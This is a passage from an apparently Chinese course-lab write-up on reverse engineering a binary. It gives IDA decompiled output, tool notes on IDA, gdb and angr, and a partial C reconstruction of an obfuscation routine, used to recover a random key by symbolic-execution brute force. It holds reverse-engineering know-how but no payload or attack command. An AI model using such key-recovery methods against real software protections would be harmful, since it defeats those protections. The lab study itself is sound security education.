dword_202020[v13];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v13 = ((_BYTE)v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v12 = v11 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v12 &amp;amp; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      a1 = a1 - (a1 &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (a1 &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; a1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;程序执行流程分析&#34;&gt;&lt;a href=&#34;#程序执行流程分析&#34; class=&#34;headerlink&#34; title=&#34;程序执行流程分析&#34;&gt;&lt;/a&gt;程序执行流程分析&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310210811794.png&#34; alt=&#34;image-20230310210811794&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		关键流程在于,随机数v7和code经过计算后输出结果.需要根据结果反推随机值.&lt;/p&gt;
&lt;h3 id=&#34;程序关键算法分析&#34;&gt;&lt;a href=&#34;#程序关键算法分析&#34; class=&#34;headerlink&#34; title=&#34;程序关键算法分析&#34;&gt;&lt;/a&gt;程序关键算法分析&lt;/h3&gt;&lt;p&gt;​		sub_C31函数对code和随机值v7进行计算,运算过程较为复杂,包含了许多位移运算,与或运算.流程较长.采用直接逆向的方法较为困难.所以采用了angr爆破的方法.&lt;/p&gt;
&lt;h2 id=&#34;工具使用&#34;&gt;&lt;a href=&#34;#工具使用&#34; class=&#34;headerlink&#34; title=&#34;工具使用&#34;&gt;&lt;/a&gt;工具使用&lt;/h2&gt;&lt;h3 id=&#34;ida&#34;&gt;&lt;a href=&#34;#ida&#34; class=&#34;headerlink&#34; title=&#34;ida&#34;&gt;&lt;/a&gt;ida&lt;/h3&gt;&lt;p&gt;​		ida用于静态分析,得到反汇编代码.&lt;/p&gt;
&lt;h3 id=&#34;gdb&#34;&gt;&lt;a href=&#34;#gdb&#34; class=&#34;headerlink&#34; title=&#34;gdb&#34;&gt;&lt;/a&gt;gdb&lt;/h3&gt;&lt;p&gt;​		gdb用于动态分析,在编写利用代码以及分析程序时,可以观察运行到某一行代码时的内存、寄存器等值和状态.&lt;/p&gt;
&lt;h3 id=&#34;angr&#34;&gt;&lt;a href=&#34;#angr&#34; class=&#34;headerlink&#34; title=&#34;angr&#34;&gt;&lt;/a&gt;angr&lt;/h3&gt;&lt;p&gt;​		angr是一个基于python的二进制分析框架,能够实施动态符号执行,和不同的静态分析.对本题目来说,angr可以对key的各种约束条件进行求解,从而爆破得到key的值.&lt;/p&gt;
&lt;h2 id=&#34;解题思路&#34;&gt;&lt;a href=&#34;#解题思路&#34; class=&#34;headerlink&#34; title=&#34;解题思路&#34;&gt;&lt;/a&gt;解题思路&lt;/h2&gt;&lt;h3 id=&#34;减少循环、获取key的完整计算过程&#34;&gt;&lt;a href=&#34;#减少循环、获取key的完整计算过程&#34; class=&#34;headerlink&#34; title=&#34;减少循环、获取key的完整计算过程&#34;&gt;&lt;/a&gt;减少循环、获取key的完整计算过程&lt;/h3&gt;&lt;p&gt;​		angr对于循环的处理较为复杂和缓慢,所以可以通过在混淆代码中加入输出key的运算过程的代码,得到完整的运算流程.&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;time.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;hunxiao&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; randnum, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *ptr)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v7; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v8; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v9; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v10; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v11; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v12; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-1Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v13; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-1Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v14; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v15; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v16; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v17; &lt;span class=&#34;comment&#34;&gt;// [rsp+24h] [rbp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v17 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v16 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v15 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v14 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v13 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dword_202020[&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x24DD20CF&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x3E4F0354&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18B2E85F&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x2F2CAFB8&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x5810ADCB&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x42F7FF85&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x36E0D6C2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x5F3EF93F&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x7F46E74A&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x44DDC864&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x64959795&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x39413451&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x5DC36C45&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x62037E7E&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x5AEA541F&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x153F8FAC&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hunxiao里面的输出%p\n&amp;quot;&lt;/span&gt;,*ptr); &lt;span class=&#34;comment&#34;&gt;//这里输出的有问题&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hunxiao里面的输出%p\n&amp;quot;&lt;/span&gt;,*ptr); &lt;span class=&#34;comment&#34;&gt;//这里输出的有问题&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//v7 = ptr[i];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v7 = *((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;*)(i + (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)ptr));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//printf(&amp;quot;%02x\n&amp;quot;, *(ptr + i));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;v7的值:%x\n&amp;quot;&lt;/span&gt;,v7);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//printf(&amp;quot;v7 &amp;amp; 1的值%x\n&amp;quot;,v7&amp;amp;1);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 看code的每个字节的第一位是否是0,如果是0进行下面操作,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v7 &amp;amp; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      randnum ^= dword_202020[v13];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//printf(&amp;quot;randnum:%x\n&amp;quot;,randnum);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v13 = ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;)v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//这句话的作用是把它范围限制在0-15位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//printf(&amp;quot;v13:%x\n&amp;quot;,v13);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v8 = v7 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//code字节右移一位,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//printf(&amp;quot;v8:%x\n&amp;quot;,v8);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v3 = v8 &amp;amp; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;// &amp;amp; 11,把v3限制在两位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 然后根据v3的值进行选择分支运算&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v14 = dword_202020[v13] | &lt;span class=&#34;number&#34;&gt;0xABCDABCD&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v13 = ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;)v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//这句话的作用是把它范围限制在0-15位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; 